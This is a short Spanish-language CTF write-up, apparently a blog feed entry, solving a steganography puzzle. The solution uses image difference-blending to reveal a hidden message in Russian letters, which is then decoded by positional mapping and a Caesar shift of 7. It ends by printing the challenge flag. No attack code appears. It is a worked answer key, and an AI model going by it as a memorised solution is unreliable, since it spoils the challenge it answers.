+&lt;p&gt;A continuación un simple write up de Susana, quien creo el reto Juntosalpoder (&lt;a href=&quot;http://suzav.com/&quot;&gt;http://suzav.com/&lt;/a&gt;) aprovecho de compartir este reto, con el animo de ayudarme en el proceso del CTF, mi novia decidió darme una mano y creo este reto que me pareció genial ya que tiene una forma de resolución muy diferente a lo que uno esta acostumbrado&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Existe una imagen escondida dentro de otra imagen.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:123} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-14.png&quot; alt=&quot;&quot; class=&quot;wp-image-123&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:124} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-15.png&quot; alt=&quot;&quot; class=&quot;wp-image-124&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Misma imagen formato jpg y png.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;En photoshop al pegar la foto jpg sobre la formato png y aplicar en la layer opción “difference” se revela una imagen negra pero que se logra ver algo escondido. Al copiar esta imagen en un archivo nuevo y jugando con los niveles de blanco y negro se puede ver un mensaje en letras rusas. Este mensaje parte con “querido cesar”&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:125} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-16.png&quot; alt=&quot;&quot; class=&quot;wp-image-125&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:126} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-17.png&quot; alt=&quot;&quot; class=&quot;wp-image-126&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:127} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-18.png&quot; alt=&quot;&quot; class=&quot;wp-image-127&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:129} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-20-1024x595.png&quot; alt=&quot;&quot; class=&quot;wp-image-129&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Primero se debe ver que letra corresponde a cada letra en ruso y después se puede descifrar según caesar cipher 7.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:128} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-19.png&quot; alt=&quot;&quot; class=&quot;wp-image-128&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Cada letra en ruso corresponde a una letra de nuestro abecedario según su orden no fonética.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:130} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-21.png&quot; alt=&quot;&quot; class=&quot;wp-image-130&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Sh ylzwblzah lzah lu lssh, ublzayh zhschkvyh xbl wlslh lu shz jhsslz.&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Sh ihuklyh ubujh jhlyh, sh ihuklyh lz JobuS1lzShtLq0Y&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;
+
+&lt;!-- wp:image {&quot;id&quot;:131} --&gt;
+&lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;/wp-content/uploads/2019/09/image-22-1024x341.png&quot; alt=&quot;&quot; class=&quot;wp-image-131&quot; /&gt;&lt;/figure&gt;
+&lt;!-- /wp:image --&gt;
+
+&lt;!-- wp:paragraph --&gt;
+&lt;p&gt;Flag: Q4{ChunL1esLamEj0R}&lt;/p&gt;
+&lt;!-- /wp:paragraph --&gt;</content><author><name></name></author><category term="CTF" /><category term="Q4" /><category term="Sin categoría" /><category term="stego" /><category term="writeup" /><summary type="html">A continuación un simple write up de Susana, quien creo el reto Juntosalpoder (http://suzav.com/) aprovecho de compartir este reto, con el animo de ayudarme en el proceso del CTF, mi novia decidió darme una mano y creo este reto que me pareció genial ya que tiene una forma de resolución muy diferente a lo que uno esta acostumbrado</summary></entry></feed>
